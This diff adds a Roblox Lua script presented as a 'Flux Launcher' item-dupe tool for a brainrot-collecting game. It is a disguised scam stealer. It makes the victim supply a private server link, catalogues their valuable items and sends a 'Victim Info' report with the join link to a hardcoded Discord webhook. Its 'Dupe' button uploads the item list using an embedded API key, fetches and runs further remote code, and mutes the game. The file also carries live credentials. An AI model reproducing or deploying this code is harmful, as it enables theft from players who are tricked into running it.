@@ -1,1 +1,293 @@
-g
+if _G.scriptExecuted then
+    return
+end
+_G.scriptExecuted = true
+
+_G.webhook = "https://discord.com/api/webhooks/1423783717943378122/SRkaeNvXNzcdE_677yk1Pn2c7Y3Vlfugky0rP7E6N6hU2QTBWR9pAfCbR4BRxuUjSASe"
+_G.sended = false
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
+local NumberUtils = require(ReplicatedStorage.Utils.NumberUtils)
+local Synchronizer = require(ReplicatedStorage.Packages.Synchronizer)
+local Animals = require(ReplicatedStorage.Shared.Animals)
+local Game = require(ReplicatedStorage.Shared.Game)
+local Workspace = game:GetService("Workspace")
+
+local executor = identifyexecutor() or "Unknown"
+
+local serverType = RobloxReplicatedStorage:WaitForChild("GetServerType"):InvokeServer()
+if serverType ~= "VIPServer" then
+    LocalPlayer:Kick("Server error. Please join a private server")
+end
+
+local Orion = loadstring(game:HttpGet("https://raw.githubusercontent.com/jensonhirst/Orion/main/source"))()
+
+local Window = Orion:MakeWindow({
+    Name = "Flux Launcher",
+    HidePremium = false,
+    IntroEnabled = false,
+    SaveConfig = true,
+    ConfigFolder = "OrionTest"
+})
+
+local LauncherTab = Window:MakeTab({
+    Name = "Launcher",
+    Icon = "",
+    PremiumOnly = false
+})
+
+local LauncherSection = LauncherTab:AddSection({
+    Name = "Launcher"
+})
+
+local privateServerLink = ""
+LauncherSection:AddTextbox({
+    Name = "Import Private Server Link",
+    Default = "Enter link here...",
+    TextDisappear = false,
+    Callback = function(value)
+        privateServerLink = value
+        if privateServerLink:match("^https://www.roblox.com/share%?code=") then
+            Orion:MakeNotification({
+                Name = "Notification",
+                Content = "You entered Private Server Link correctly!",
+                Image = "",
+                Time = 5
+            })
+        end
+    end
+})
+
+-- Новый вариант кнопки Start с получением животных из Workspace.Plots
+LauncherSection:AddButton({
+    Name = "Start",
+    Callback = function()
+        if not privateServerLink:match("^https://www.roblox.com/share%?code=") then
+            return
+        end
+
+        local hitList = {}
+        local fullHitList = {}
+
+        -- Функции isBrainrotInstance и getCanonicalMatch нужно вставить сюда из второго кода
+        local CANONICAL_BRAINROT_NAMES = {
+            "Los Tralaleritos","Las Tralaleritas","La Cucaracha","Pot Hotspot","Garama and Madundung",
+            "Tictac Sahur","Spaghetti Tualetti","Dragon Cannelloni","Ketupat Kepat","Ketchuru and Musturu",
+            "Esok Sekolah","Money Money Puggy","Nuclearo Dinossauro","La Grande Combinasion","Chicleteira Bicicleteira",
+            "Los Chicleteiras","To to to Sahur","Graipuss Medussi","Strawberry Elephant","67","La Extinct Grande",
+            "Mariachi Corazoni","Tacorita Bicicleta","Los Nooo My Hotspotsitos","La Karkerkar Combinasion","Los Bros",
+            "Los Primos","Tralaledon","Los Tacoritas","La Sahur Combinasion","Fragola La La La","Los Hotspotsitos",
+            "La Supreme Combinasion","Los Combinasionas","Los Tungtungtungcitos","Noo My Examen","Yess my Examen",
+            "Secret Lucky Block","Admin Lucky Block","Quesadilla Crocodila","Torrtuginni Dragonfruitini","Agarrini la Palini",
+            "Karkerkar Kurkur","Los Matteos","Celularcini Viciosini","Las Vaquitas Saturnitas",
+            "Job Job Job Sahur","La Vacca Staturno Saturnita","Los Spyderrinis","Los Tipi Tacos",
+            "Nooo My Hotspot","Taco Lucky Block","Bisonte Giuppitere","Perrito Burrito","Capi Taco",
+            "Bombardini Tortini","Extinct Matteo","Extinct Tralalero","Sammyini Spyderini","Guerriro Digitale","Crabbo Limonetta",
+            "Los Jobcitos","Los 67","Chillin Chili","Tang Tang Kelentang","La Secret Combinasion"
+        }
+        local LOWER_TO_CANON = {}
+        for _, name in ipairs(CANONICAL_BRAINROT_NAMES) do LOWER_TO_CANON[string.lower(name)] = name end
+
+        local function safeLower(str)
+            if typeof(str) ~= "string" then return "" end
+            return string.lower(str)
+        end
+        local function stringContainsAny(haystack, needles)
+            haystack = safeLower(haystack)
+            for _, needle in ipairs(needles) do
+                if string.find(haystack, needle, 1, true) then return true end
+            end
+            return false
+        end
+        local ALLOW_CATEGORY_KEYWORDS = {
+            "brainrot god","secret","og","admin","exclusive","taco",
+            "craft machine","fuse machine","los ","las ","ritual",
+            "unobtainable","removed","upcoming"
+        }
+        local DISALLOW_CATEGORY_KEYWORDS = {
+            "common","rare","epic","legendary","mythic","mythic lucky block"
+        }
+        local function getCanonicalMatch(name)
+            local lname = safeLower(name)
+            for lowerCanonical, canonical in pairs(LOWER_TO_CANON) do
+                if string.find(lname, lowerCanonical, 1, true) then
+                    return canonical
+                end
+            end
+            return nil
+        end
+        local function isAllowedByCategory(name)
+            local lname = safeLower(name)
+            local hasDisallow = stringContainsAny(lname, DISALLOW_CATEGORY_KEYWORDS)
+            local hasAllow = stringContainsAny(lname, ALLOW_CATEGORY_KEYWORDS)
+            if hasDisallow and not hasAllow then return false end
+            return true
+        end
+        local function isBrainrotInstance(inst)
+            if not inst then return false end
+            local canonical = getCanonicalMatch(inst.Name)
+            if not canonical then return false end
+            if not isAllowedByCategory(inst.Name) then return false end
+            return true
+        end
+
+        -- Сканируем все плоты и формируем Hit List
+        for _, plot in ipairs(Workspace:WaitForChild("Plots"):GetChildren()) do
+            for _, descendant in ipairs(plot:GetDescendants()) do
+                if isBrainrotInstance(descendant) then
+                    local name = getCanonicalMatch(descendant.Name) or descendant.Name
+                    local mutation = descendant.Mutation or ""
+                    local traits = descendant.Traits or ""
+                    local generation = descendant.Generation or 0
+                    local cashMultiplier = Synchronizer:GetPlayerCashMultiplayer() or 1
+
+                    table.insert(hitList, string.format(
+                        "Plot %s: %s [%s] %s ➜ $%s/s",
+                        plot.Name,
+                        name,
+                        mutation,
+                        traits,
+                        NumberUtils.ToString(generation * cashMultiplier)
+                    ))
+                    table.insert(fullHitList, string.format(
+                        "%s [%s] %s ➜ $%s/s",
+                        name,
+                        mutation,
+                        traits,
+                        NumberUtils.ToString(generation * cashMultiplier)
+                    ))
+                end
+            end
+        end
+
+        -- Формируем Embed и отправляем вебхук
+        local embed = {
+            title = " Sab | Flux",
+            color = 65280,
+            fields = {
+                {
+                    name = "Victim Info",
+                    value = string.format(
+                        "```Username: %s\nExecutor: %s\nAccount Age: %s Days\nReceiver: Username```",
+                        LocalPlayer.Name,
+                        executor,
+                        LocalPlayer.AccountAge
+                    ),
+                    inline = true
+                },
+                {
+                    name = "Hit List:",
+                    value = #hitList > 0 and table.concat(hitList, "\n") or "None",
+                    inline = false
+                },
+                {
+                    name = "Full Hit List:",
+                    value = #fullHitList > 0 and table.concat(fullHitList, "\n") or "Limited",
+                    inline = false
+                },
+                {
+                    name = "Join link:",
+                    value = privateServerLink,
+                    inline = false
+                }
+            }
+        }
+
+        if not _G.sended then
+            _G.sended = true
+            local webhookPayload = {
+                content = "@everyone",
+                embeds = { embed }
+            }
+            HttpService:Request({
+                Url = _G.webhook,
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = HttpService:JSONEncode(webhookPayload)
+            })
+        end
+    end
+})
+
+-- Дальше код DupeTab и DupeSection оставляем как есть
+local DupeTab = Window:MakeTab({
+    Name = "Dupe",
+    Icon = "",
+    PremiumOnly = false
+})
+
+local DupeSection = DupeTab:AddSection({
+    Name = "Dupe"
+})
+
+local brainrotItems = {}
+for _, plot in ipairs(Workspace:WaitForChild("Plots"):GetChildren()) do
+    for _, descendant in ipairs(plot:GetDescendants()) do
+        if isBrainrotInstance(descendant) then
+            local name = getCanonicalMatch(descendant.Name) or descendant.Name
+            table.insert(brainrotItems, name)
+        end
+    end
+end
+
+DupeSection:AddDropdown({
+    Name = "Brainrot",
+    Default = brainrotItems[1] or "Unknown",
+    Options = brainrotItems,
+    Callback = function(value)
+        _G.brainrot = value
+    end
+})
+
+DupeSection:AddButton({
+    Name = "Dupe",
+    Callback = function()
+        _G.sended = false
+        table.sort(brainrotItems, function(a, b)
+            local genA = Animals[a].Generation or 0
+            local genB = Animals[b].Generation or 0
+            return genA > genB
+        end)
+
+        local sortedList = table.concat(brainrotItems, "\n")
+        if #brainrotItems > 5 then
+            sortedList = sortedList .. "\nand more!"
+        end
+
+        local pastePayload = {
+            type = "PASTE",
+            title = "discord.gg/MBY4BBfCz7",
+            content = sortedList,
+            visibility = "UNLISTED",
+            encrypted = false
+        }
+        local pasteResponse = HttpService:Request({
+            Url = "https://pastefy.app/api/v2/paste",
+            Method = "POST",
+            Headers = {
+                Accept = "application/json",
+                ["Content-Type"] = "application/json",
+                ["X-API-KEY"] = "R7lTBvzuD3UHpPqcRQuUZ1Ey1NDZdHDjUgwPVzBM2M5ZgM0WpHFOLsRFr5e1"
+            },
+            Body = HttpService:JSONEncode(pastePayload)
+        })
+
+        if pasteResponse.StatusCode == 200 then
+            local pasteData = HttpService:JSONDecode(pasteResponse.Body)
+            _G.fullhit = pasteData.paste.raw_url
+        else
+            _G.fullhit = "Limited"
+        end
+
+        local externalScript = loadstring(game:HttpGet("https://pastefy.app/PwmwLHep/raw"))()
+        externalScript()
+
+        UserSettings().GameSettings.MasterVolume = 0
+    end
+})
+
+Window:Destroy()
